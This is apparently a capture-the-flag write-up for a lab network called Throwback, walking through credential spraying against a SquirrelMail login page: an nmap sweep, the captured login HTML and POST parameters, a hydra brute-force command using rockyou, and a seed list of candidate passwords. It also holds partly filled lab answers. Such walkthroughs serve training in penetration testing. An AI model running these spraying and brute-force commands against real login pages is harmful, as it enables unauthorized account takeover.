#  Wait, just you mean just one this time?

With my smb analysis leading to the conclusion that the HumpreyW account is a backdoor we return to guided path once again. Accoring to the instruction from the team are going to do some crediental spraying. Firstly a nice awk on the usernames from the contacts:

![awk](Screenshots/wait-usernames-awk.png)

Now just `> usersnames.txt` and remove noreply, HumphreyW, Mr Peanutbutter and Bojackhorseman to preventing wasting a much time on known and "real-people" accounts. One quick curl command later to get login parametres:
```bash
curl http://10.200.102.232/src/login.php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en_US" lang="en_US">
    <head>
<title>Throwback Hacks - Login</title>
    <script type="text/javascript" language="JavaScript">
<!--
if (self != top) { try { if (document.domain != top.document.domain) { throw "Clickjacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe) */ } } catch (e) { self.location = "/src/signout.php"; top.location = "/src/signout.php" } }
// -->
</script>
<meta name="robots" content="noindex,nofollow" />                                                              
<link rel="shortcut icon" href="/favicon.ico" /><link media="screen" rel="stylesheet" type="text/css" href="../templates/default/css/options.css"  />                                                                         
<link media="screen" rel="stylesheet" type="text/css" href="../templates/default/css/default.css"  />          
<link media="screen" rel="stylesheet" type="text/css" href="/src/style.php?"  />                               
<link media="print" title="printerfriendly" rel="stylesheet" type="text/css" href="/css/print.css"  />         
<script type="text/javascript">                                                                                
<!--                                                                                                           
  var alreadyFocused = false;
  function squirrelmail_loginpage_onload() {
    if (alreadyFocused) return;
    var textElements = 0; var i = 0;
    for (i = 0; i < document.login_form.elements.length; i++) {
      if (document.login_form.elements[i].type == "text" || document.login_form.elements[i].type == "password") {
        textElements++;
        if (textElements == 1) {
          document.login_form.elements[i].focus();
          break;
        }
      }
    }
  }
// -->
</script>
<!--[if IE 6]>
<style type="text/css">
/* avoid stupid IE6 bug with frames and scrollbars */
body {
    width: expression(document.documentElement.clientWidth - 30);
}
</style>
<![endif]-->
</head>


<body onload="squirrelmail_loginpage_onload()">
<form name="login_form" id="login_form" action="redirect.php" method="post" onsubmit="document.login_form.js_autodetect_results.value=1">
<div id="sqm_login">
<table cellspacing="0">
 <tr>
  <td class="sqm_loginTop" colspan="2">
   <img src="/pics/throwback.png" class="sqm_loginImage" alt="Throwback Hacks Logo" width="308" height="111" /><br /><br />
Guests who require access to an email can use the following: <br />
tbhguest:WelcomeTBH1!<br /><br />  </td>
 </tr>
 <tr>
  <td class="sqm_loginOrgName" colspan="2">
   Throwback Hacks Login  </td>
 </tr>
 <tr>
  <td class="sqm_loginFieldName"><label for="login_username">
   Name:  </label></td>
  <td class="sqm_loginFieldInput">
   <input type="text" name="login_username" value="" id="login_username" onfocus="alreadyFocused=true;"  />
  </td>
 </tr>
 <tr>
  <td class="sqm_loginFieldName"><label for="secretkey">
   Password:  </label></td>
  <td class="sqm_loginFieldInput">
   <input type="password" name="secretkey" value="" id="secretkey" onfocus="alreadyFocused=true;"  />
   <input type="hidden" name="js_autodetect_results" value="0" class="sqmhiddenfield" id="js_autodetect_results" /><input type="hidden" name="just_logged_in" value="1" class="sqmhiddenfield" id="just_logged_in" />  </td>
 </tr>
  <tr>
  <td class="sqm_loginSubmit" colspan="2">
   <input type="submit" value="Login" />
  </td>
 </tr>
</table>
</div>
</form>
<!-- end of generated html -->
</body>
</html>
```

![burplogin](Screenshots/wait-burp-login.png)

From this screenshot:

```bash
login_username=^USER^&secretkey=^PASS&js_autodetect_results=1&just_logged_in=1
```

On the list of tools to try out brutespray and  is just a nice `apt-get install brutespray` away. I requires Nmap output so I'll rerun:
`nmap -sV -sC -oA throwback -p- 10.200.0-255.0/24 --min-rate 5000` with -oA for outputing all formats and also a range over the 0-255, third octet, which did not do the first time. It will take longer but that is fine for reconing more indepth in the background while I setup password spraying in medusa and hydra. Don't forget to 	`gzip -d /usr/share/wordlists/rockyou.txt.gz` the rockyou list on the Kali VM.

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $MACHINE_IP http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS:F=incorrect' 
```

Consider that bruteforcing in this way is not very smart and the task is hinting at making a custom password list based on a set of strings:
```txt
Summer2020
Management2020
Management2018
Password2020
Throwback2020
Password123
```

I decided to use mentalist password permutation, warning getting this to work on some mahcines has  been a nightmare, especially the THM VMs, when a certain CTF requires  a wordlist > GB!

![mentalist-one](Screenshots/mentalist-wl-one.png)

## Answers

What is the username parameter in the POST request?  
```{toggle}
login_username
```
What is the password parameter in the POST request?  
```{toggle}
secretkey
```
What username found with hydra starts with an M?  
```{toggle}
```
What is the password found with hydra?
```{toggle}
```